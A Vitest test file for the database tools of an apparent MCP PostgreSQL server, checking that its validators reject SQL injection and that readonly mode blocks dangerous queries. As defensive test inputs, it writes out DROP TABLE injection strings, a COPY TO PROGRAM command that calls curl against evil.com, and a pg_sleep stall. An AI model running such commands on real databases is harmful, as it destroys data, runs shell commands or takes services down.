import { describe, it, expect, vi, beforeEach } from "vitest";

function createMockPool(queryResult: any = { rows: [], rowCount: 0 }) {
  const mockClient = {
    query: vi.fn().mockResolvedValue(queryResult),
    release: vi.fn(),
  };
  return {
    connect: vi.fn().mockResolvedValue(mockClient),
    query: vi.fn().mockResolvedValue(queryResult),
    on: vi.fn(),
    end: vi.fn(),
    mockClient,
  };
}

describe("CoreTools - SQL Injection Protection", () => {
  it("validateTableName rejects injection in table arg", async () => {
    const { validateTableName } = await import(
      "../src/utils/sqlValidator.js"
    );
    expect(() => validateTableName("x; DROP TABLE users; --")).toThrow();
  });

  it("validateColumnName rejects injection in column arg", async () => {
    const { validateColumnName } = await import(
      "../src/utils/sqlValidator.js"
    );
    expect(() => validateColumnName("col; DROP TABLE x;--")).toThrow();
  });
});

describe("CoreTools - Readonly Security", () => {
  it("blocks COPY in readonly mode", async () => {
    const { CoreTools } = await import("../src/tools/coreTools.js");
    const pool = createMockPool();
    const mockServer = { addTool: vi.fn() };
    const tools = new CoreTools(pool as any, mockServer as any);
    tools.registerTools();

    const queryToolCall = mockServer.addTool.mock.calls.find(
      (c: any) => c[0].name === "MCP_PG_VECTOR",
    );
    expect(queryToolCall).toBeDefined();

    const executor = queryToolCall[0].execute;
    const result = await executor({
      sql: "COPY users TO PROGRAM 'curl http://evil.com'",
      readonly: true,
      limit: 100,
    });

    expect(result).toContain("bloqu");
  });

  it("blocks pg_sleep in readonly mode", async () => {
    const { CoreTools } = await import("../src/tools/coreTools.js");
    const pool = createMockPool();
    const mockServer = { addTool: vi.fn() };
    const tools = new CoreTools(pool as any, mockServer as any);
    tools.registerTools();

    const queryToolCall = mockServer.addTool.mock.calls.find(
      (c: any) => c[0].name === "MCP_PG_VECTOR",
    );
    const executor = queryToolCall[0].execute;
    const result = await executor({
      sql: "SELECT pg_sleep(1000)",
      readonly: true,
      limit: 100,
    });

    expect(result).toContain("bloqu");
  });

  it("blocks multi-statements in readonly mode", async () => {
    const { CoreTools } = await import("../src/tools/coreTools.js");
    const pool = createMockPool();
    const mockServer = { addTool: vi.fn() };
    const tools = new CoreTools(pool as any, mockServer as any);
    tools.registerTools();

    const queryToolCall = mockServer.addTool.mock.calls.find(
      (c: any) => c[0].name === "MCP_PG_VECTOR",
    );
    const executor = queryToolCall[0].execute;
    const result = await executor({
      sql: "SELECT 1; INSERT INTO users VALUES ('evil')",
      readonly: true,
      limit: 100,
    });

    expect(result).toContain("multi-statements");
  });
});

describe("CoreTools - B6 Limit Bug", () => {
  it("strips trailing semicolon before LIMIT wrapping", async () => {
    const { CoreTools } = await import("../src/tools/coreTools.js");
    const pool = createMockPool({ rows: [{ id: 1 }], rowCount: 1 });
    const mockServer = { addTool: vi.fn() };
    const tools = new CoreTools(pool as any, mockServer as any);
    tools.registerTools();

    const queryToolCall = mockServer.addTool.mock.calls.find(
      (c: any) => c[0].name === "MCP_PG_VECTOR",
    );
    const executor = queryToolCall[0].execute;
    await executor({
      sql: "SELECT * FROM users;",
      readonly: true,
      limit: 100,
    });

    const queryArg = pool.mockClient.query.mock.calls[0][0];
    expect(queryArg).not.toMatch(/;\s*LIMIT/);
    expect(queryArg).toMatch(/LIMIT 100/);
  });
});

describe("CoreTools - 9 tools registered", () => {
  it("registers exactly 9 core tools", async () => {
    const { CoreTools } = await import("../src/tools/coreTools.js");
    const pool = createMockPool();
    const mockServer = { addTool: vi.fn() };
    const tools = new CoreTools(pool as any, mockServer as any);
    tools.registerTools();

    expect(mockServer.addTool).toHaveBeenCalledTimes(9);
  });
});
